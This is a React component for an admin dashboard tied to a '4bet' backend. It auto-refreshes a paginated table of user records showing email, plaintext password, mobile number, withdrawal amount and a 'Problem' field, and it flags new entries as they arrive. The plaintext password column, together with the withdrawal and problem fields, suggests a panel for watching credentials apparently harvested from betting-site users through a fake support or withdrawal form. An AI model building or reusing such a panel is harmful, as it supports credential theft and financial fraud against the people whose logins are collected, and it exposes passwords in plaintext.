import React, { useState, useEffect } from 'react';
import axios from 'axios';

const UserDetails = () => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(0);
  const [totalUsers, setTotalUsers] = useState(0);
  const [lastRefreshTime, setLastRefreshTime] = useState(new Date());
  const [isRefreshing, setIsRefreshing] = useState(false);
  const pageSize = 20; // Show 20 entries per page

  // Function to fetch users data
  const fetchUsers = async (page) => {
    try {
      setIsRefreshing(true);
      const response = await axios.get('https://backend-4bet.vercel.app/usersdetails', {
        headers: {
          Authorization: `Bearer ${localStorage.getItem('token')}`
        },
        params: {
          page: page,
          limit: pageSize
        }
      });
      
      // Update last refresh time
      const currentTime = new Date();
      setLastRefreshTime(currentTime);
      
      // Sort users with newest first - try multiple sorting methods
      const sortedUsers = [...response.data.users].sort((a, b) => {
        // First try custom timestamp field if available
        if (a.timestamp && b.timestamp) {
          return b.timestamp.localeCompare(a.timestamp);
        }
        // Then try MongoDB _id (which contains timestamp)
        else if (a._id && b._id) {
          return b._id.localeCompare(a._id);
        } 
        // Then try createdAt field if available
        else if (a.createdAt && b.createdAt) {
          return new Date(b.createdAt) - new Date(a.createdAt);
        }
        return 0;
      });
      
      setUsers(sortedUsers);
      setTotalUsers(response.data.totalUsers);
      setTotalPages(Math.ceil(response.data.totalUsers / pageSize));
      setLoading(false);
      setIsRefreshing(false);
    } catch (err) {
      console.error('Error fetching user data:', err);
      setError('Failed to load users. Please try again.');
      setLoading(false);
      setIsRefreshing(false);
    }
  };

  // Initial fetch
  useEffect(() => {
    fetchUsers(currentPage);
  }, [currentPage]);
  
  // Set up auto-refresh every 30 seconds
  useEffect(() => {
    const refreshInterval = setInterval(() => {
      fetchUsers(currentPage);
    }, 30000); // 30 seconds
    
    // Clean up interval on component unmount
    return () => clearInterval(refreshInterval);
  }, [currentPage]);

  const handlePageChange = (newPage) => {
    if (newPage > 0 && newPage <= totalPages) {
      setCurrentPage(newPage);
    }
  };
  
  const handleManualRefresh = () => {
    fetchUsers(currentPage);
  };

  // Format date with fallback
  const formatDate = (dateString) => {
    if (!dateString) return 'N/A';
    
    try {
      // If it's already formatted nicely (like our custom timestamp), return as is
      if (typeof dateString === 'string' && !dateString.includes('T')) {
        return dateString;
      }
      
      const date = new Date(dateString);
      // Check if date is valid
      if (isNaN(date.getTime())) {
        return 'Invalid Date';
      }
      return date.toLocaleString();
    } catch (error) {
      return 'Invalid Date';
    }
  };

  if (loading && !isRefreshing) return <div>Loading users...</div>;
  if (error && !isRefreshing) return <div>{error}</div>;

  return (
    <div style={{ padding: '20px' }}>
      <h1>User Details</h1>
      
      {/* Auto-refresh info and manual refresh button */}
      <div style={{ 
        display: 'flex', 
        justifyContent: 'space-between', 
        alignItems: 'center', 
        margin: '10px 0', 
        backgroundColor: '#f0f8ff', 
        padding: '10px', 
        borderRadius: '4px',
        position: 'sticky',
        top: 0,
        zIndex: 100,
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        <div>
          <p>Auto-refreshing every 30 seconds. Last updated: {lastRefreshTime.toLocaleTimeString()}</p>
          <p>Showing {users.length} of {totalUsers} users (Page {currentPage} of {totalPages})</p>
          <p><strong>Note:</strong> Newest users appear at the top</p>
        </div>
        <button 
          onClick={handleManualRefresh}
          disabled={isRefreshing}
          style={{ 
            padding: '8px 15px', 
            backgroundColor: isRefreshing ? '#a0a0a0' : '#4CAF50', 
            color: 'white',
            border: 'none',
            borderRadius: '4px',
            cursor: isRefreshing ? 'not-allowed' : 'pointer'
          }}
        >
          {isRefreshing ? 'Refreshing...' : 'Refresh Now'}
        </button>
      </div>
      
      <table style={{ width: '100%', borderCollapse: 'collapse', marginBottom: '20px' }}>
        <thead>
          <tr style={{ backgroundColor: '#f4f4f4' }}>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>No.</th>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>Email</th>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>Password</th>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>Mobile Number</th>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>Withdrawal Amount</th>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>Problem</th>
            <th style={{ padding: '10px', border: '1px solid #ddd' }}>Timestamp</th>
          </tr>
        </thead>
        <tbody>
          {users.map((user, index) => {
            // Determine if this is a new entry (added in the past 2 minutes)
            const isNewEntry = user.timestamp ? 
              (new Date() - new Date(formatDate(user.timestamp))) < 2 * 60 * 1000 :
              user.createdAt && (new Date() - new Date(user.createdAt) < 2 * 60 * 1000);
            
            return (
              <tr 
                key={user._id} 
                style={isNewEntry ? { backgroundColor: '#e8f5e9' } : {}}
              >
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>
                  {(currentPage - 1) * pageSize + index + 1}
                  {isNewEntry && (
                    <span style={{
                      marginLeft: '5px',
                      backgroundColor: '#4CAF50',
                      color: 'white',
                      padding: '2px 6px',
                      borderRadius: '10px',
                      fontSize: '11px'
                    }}>
                      NEW
                    </span>
                  )}
                </td>
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>{user.email}</td>
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>{user.password || 'N/A'}</td>
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>{user.mobileNumber}</td>
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>{user.withdrawalAmount}</td>
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>{user.problem}</td>
                <td style={{ padding: '10px', border: '1px solid #ddd' }}>
                  {user.timestamp ? formatDate(user.timestamp) : formatDate(user.createdAt)}
                </td>
              </tr>
            );
          })}
        </tbody>
      </table>
      
      {/* Pagination Controls */}
      <div style={{ display: 'flex', justifyContent: 'center', margin: '20px 0' }}>
        <button 
          onClick={() => handlePageChange(1)} 
          disabled={currentPage === 1}
          style={{ margin: '0 5px', padding: '5px 10px' }}
        >
          First
        </button>
        <button 
          onClick={() => handlePageChange(currentPage - 1)} 
          disabled={currentPage === 1}
          style={{ margin: '0 5px', padding: '5px 10px' }}
        >
          Previous
        </button>
        
        <div style={{ margin: '0 10px', display: 'flex', alignItems: 'center' }}>
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            // Show 5 page numbers centered around current page
            let pageNum;
            if (totalPages <= 5) {
              pageNum = i + 1;
            } else if (currentPage <= 3) {
              pageNum = i + 1;
            } else if (currentPage >= totalPages - 2) {
              pageNum = totalPages - 4 + i;
            } else {
              pageNum = currentPage - 2 + i;
            }
            
            return (
              <button
                key={pageNum}
                onClick={() => handlePageChange(pageNum)}
                style={{ 
                  margin: '0 2px', 
                  padding: '5px 10px',
                  background: currentPage === pageNum ? '#4CAF50' : '#f1f1f1',
                  color: currentPage === pageNum ? 'white' : 'black'
                }}
              >
                {pageNum}
              </button>
            );
          })}
        </div>
        
        <button 
          onClick={() => handlePageChange(currentPage + 1)} 
          disabled={currentPage === totalPages}
          style={{ margin: '0 5px', padding: '5px 10px' }}
        >
          Next
        </button>
        <button 
          onClick={() => handlePageChange(totalPages)} 
          disabled={currentPage === totalPages}
          style={{ margin: '0 5px', padding: '5px 10px' }}
        >
          Last
        </button>
      </div>
    </div>
  );
};

export default UserDetails;
